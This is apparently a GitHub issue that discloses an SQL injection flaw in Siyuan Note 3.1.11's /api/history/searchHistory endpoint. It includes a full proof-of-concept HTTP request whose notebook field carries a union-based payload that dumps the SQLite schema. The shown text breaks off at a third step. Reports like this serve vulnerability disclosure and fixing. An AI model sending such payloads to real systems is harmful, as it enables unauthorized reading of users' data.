### **[TaiPhung217](/TaiPhung217)** commented [Nov 6, 2024](#issue-2637544796)

| Is there an existing issue for this?  * I have searched the existing issues  Can the issue be reproduced with the default theme (daylight/midnight)?  * I was able to reproduce the issue with the default theme  Could the issue be due to extensions?  * I've ruled out the possibility that the extension is causing the problem.  Describe the problem An SQL injection vulnerability has been identified in version 3.1.11 of the Siyuan Note application in the notebook parameter of the `POST /api/history/searchHistory` endpoint. By sending a payload we can inject an sql query POC Steps to Reproduce:   1. Set up the Siyuan Note application `version 3.1.11` in a local environment. 2. Send the following request to the `/api/history/searchHistory` endpoint:  ``` POST /api/history/searchHistory HTTP/1.1 Host: localhost:6806 Content-Length: 98 sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126" sec-ch-ua-platform: "Windows" Accept-Language: en-US sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36 Content-Type: text/plain;charset=UTF-8 Accept: */* Origin: http://localhost:6806 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Referer: http://localhost:6806/stage/build/desktop/?r=vshr05s Accept-Encoding: gzip, deflate, br Cookie: siyuan=MTczMDg2MTkxNnxEWDhFQVFMX2dBQUJFQUVRQUFCeF80QUFBUVp6ZEhKcGJtY01CZ0FFWkdGMFlRWnpkSEpwYm1jTVZRQlRleUpYYjNKcmMzQmhZMlZ6SWpwN0lpOXphWGwxWVc0dmQyOXlhM053WVdObEx5STZleUpCWTJObGMzTkJkWFJvUTI5a1pTSTZJakV5TXpRaUxDSkRZWEIwWTJoaElqb2lZbWcxY21KMmVTSjlmWDA9fF5xFoKuR_nqED8t-xyAdLUhXwMIaj9E3nswwd1J_2-M; _ga=GA1.1.1190341866.1730861926; _ga_L7WEXVQCR9=GS1.1.1730861926.1.1.1730865096.0.0.0 Connection: keep-alive  {"notebook":"%' union SELECT sql FROM sqlite_schema -- -","query":"","page":1,"op":"all","type":0}  ```  3.
